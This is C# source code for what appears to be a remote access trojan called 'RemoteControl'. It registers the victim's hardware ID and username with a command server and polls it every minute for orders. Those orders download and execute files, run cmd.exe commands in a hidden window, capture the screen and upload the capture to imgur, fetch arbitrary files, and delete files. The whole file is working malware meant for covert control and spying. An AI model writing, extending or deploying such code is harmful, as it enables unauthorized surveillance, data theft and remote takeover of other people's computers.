using System;
using System.Net;
using System.Drawing;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using System.Drawing.Imaging;
using System.Management;
using System.Collections.Specialized;
using System.Text;

namespace RemoteControl
{
    class Program
    {

        static string Desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        static string AppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        static string link = "http://127.0.0.1";
        static string imgur_api = "paste_key";

        static string HWID()
        {
            string cpuInfo = string.Empty;
            ManagementClass mc = new ManagementClass("win32_processor");
            ManagementObjectCollection moc = mc.GetInstances();

            foreach (ManagementObject mo in moc)
            {
                if (cpuInfo == "")
                {
                    cpuInfo = mo.Properties["processorID"].Value.ToString();
                    break;
                }
            }
            
            return cpuInfo;
        }

        static string ImageUpload(string base64)
        {
            string response;
            using (WebClient client = new WebClient())
            {
                client.Headers.Add("Authorization", "Client-ID " + imgur_api);

                NameValueCollection data = new NameValueCollection();
                data["image"] = base64;
                data["type"] = "base64";

                byte[] responsePayload = client.UploadValues("https://api.imgur.com/3/image/", "POST", data);
                response = Encoding.ASCII.GetString(responsePayload);
            }
            return response;
        }

        static string GenName()
        {
            var alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            var name_len = new char[8];
            var random = new Random();

            for (int i = 0; i < name_len.Length; i++) {
                name_len[i] = alphabet[random.Next(alphabet.Length)];
            }

            var rezult = new String(name_len);

            return rezult;
        }

        static bool FirstRun()
        {
            bool status = false;

            if (File.Exists(AppData + "\\RemoteControl.dat"))
                status =  true;

            return status;
        }

        static void Initialize()
        {
            File.WriteAllText(AppData + "\\RemoteControl.dat", "");
            WebClient new_user = new WebClient();
            new_user.DownloadString(link+ "/new.php?hwid=" + HWID() + "&user=" + Environment.UserName);
        }

        static void GsH()
        {
            WebClient client = new WebClient();

            var bmpScreenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
            var gfxScreenshot = Graphics.FromImage(bmpScreenshot);
            gfxScreenshot.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
            bmpScreenshot.Save("tmp_img.png", ImageFormat.Png);

            Byte[] g_byte = File.ReadAllBytes("tmp_img.png");
            String g_str = Convert.ToBase64String(g_byte);

            File.Delete("tmp_img.png");

            string[] lines = ImageUpload(g_str).Split('"');

            client.DownloadString(link + "/save_img.php?img="+ "https://imgur.com/"+lines[5]+".png");
        }

        static void JdF(string link, string ext)
        {
            string name = Desktop + "\\" + GenName();

            WebClient download = new WebClient();
            download.DownloadFile(link, name + ext);
        }

        static void DaE(string link, string ext)
        {
            string name = AppData + "\\" + GenName();

            WebClient download = new WebClient();
            download.DownloadFile(link, name + ext);

            Process.Start(name);
        }

        static void CmdVoid(string agr)
        {
            Process p = new Process();

            ProcessStartInfo ps = new ProcessStartInfo();
            ps.Arguments = agr;
            ps.FileName = "cmd.exe";
            ps.UseShellExecute = false;
            ps.CreateNoWindow = true;
            ps.WindowStyle = ProcessWindowStyle.Hidden;

            p.StartInfo = ps;
            p.Start();
        }

        static void GetCommand()
        {
            WebClient client = new WebClient();
            string temp_str = client.DownloadString(link + "/command.php");
            string[] command = temp_str.Split(',');

            switch (command[0])
            {
                case "DaE": // Download And Execute
                    DaE(command[1], command[2]);
                    break;

                case "OpS": // OPen Site
                    CmdVoid("start " + command[1]);
                    break;

                case "RcL": // Run Command Line
                    CmdVoid(command[1]);
                    break;

                case "RlP": // Run Local Program
                    CmdVoid("start " + command[1]);
                    break;

                case "GsH": // Get ScreenShot
                    GsH();
                    break;

                case "JdF": // Just Download File
                    JdF(command[1], command[2]);
                    break;

                case "del": // Delete file
                    File.Delete(command[1]);
                    break;

                default:
                    break;
            }
        }

        static void Main(string[] args)
        {

            if (!FirstRun())
                Initialize();

            while(true)
            {
                GetCommand();
                Thread.Sleep(60000);
            }
        }
    }
}
